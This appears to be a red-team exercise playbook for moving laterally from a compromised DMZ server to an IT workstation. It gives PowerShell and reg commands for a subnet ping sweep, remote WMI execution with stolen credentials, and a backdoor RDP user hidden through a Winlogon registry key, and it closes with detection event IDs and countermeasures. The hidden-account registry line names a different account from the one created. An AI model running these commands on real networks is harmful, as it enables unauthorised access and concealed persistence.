# Step 3: Lateral Movement from DMZ Web Server to IT Workstation via WMI

## Objective

Leverage valid credentials from the DMZ web server to scan internal IT subnet and execute remote commands on an IT workstation using WMI. Establish local persistence via a hidden user account.

## Context

-   DMZ web server has been compromised in a prior step.
    
-   Valid IT admin credentials acquired via credential dump or insider inject.
    
-   Goal is to identify reachable IT hosts, move laterally via WMI, and maintain access through a hidden local user account.

## Execution

### 1. Scan Internal IT Subnet from DMZ

##### PowerShell ICMP Sweep:
```powershell
1..254 (*Start a loop from 1 to 254*) | ForEach-Object {
  $ip = "192.168.1.$_" (*Build an IP like `192.168.1.1`, `192.168.1.2`, etc.*)
  if (Test-Connection -ComputerName $ip -Count 1 -Quiet) (*Ping the IP (quietly, just yes/no*)){
    Write-Output "$ip is up" (*If the IP responds, print it*)
  }
}
```

### 2. Execute Remote Command on IT Workstation via WMI

-   Use PowerShell and valid credentials to trigger a remote command:
    

powershell

`Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName it-workstation01 -Credential $itAdmin` 

### 3. Establish Persistence via Hidden Local User

-   From the same session or compromised host:

powershell

`$Password = ConvertTo-SecureString "P@ssw0rd123" -AsPlainText -Force
New-LocalUser "svc_diag" -Password $Password -Description "Service Recovery Agent"
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "svc_diag"` 

### 4. Hide the Account in Registry

`reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v svc_netlog /t REG_DWORD /d 0 /f` 

## Result

-   Internal IT asset discovered and reached from the DMZ.
    
-   Remote command execution via WMI confirmed.
    
-   Hidden persistence established via new local user.
    
-   Red Team positioned to pivot deeper into the IT network.

## Detection Opportunities

| Event ID | Description |
|--|--|
| 4688 | Process creation via WMI |
| 4624 | Remote login to IT workstation |
|4720|New local user creation|
| 13 | Registry modification |
| PowerShell Logging | Remote WMI usage, account creation |


#### How to create the hidden user:
    
    -   Create a local user with PowerShell
        
    -   Add to RDP group
        
    -   Hide the user via registry edits

## Defensive Countermeasures

-   Block WMI/PowerShell remoting across DMZ and internal networks.
    
-   Alert on lateral tool use from DMZ (Invoke-WmiMethod, PsExec, etc.).
    
-   Monitor creation of local accounts and registry changes for hidden users.
    
-   Enforce firewall rules limiting access from DMZ to internal subnets.
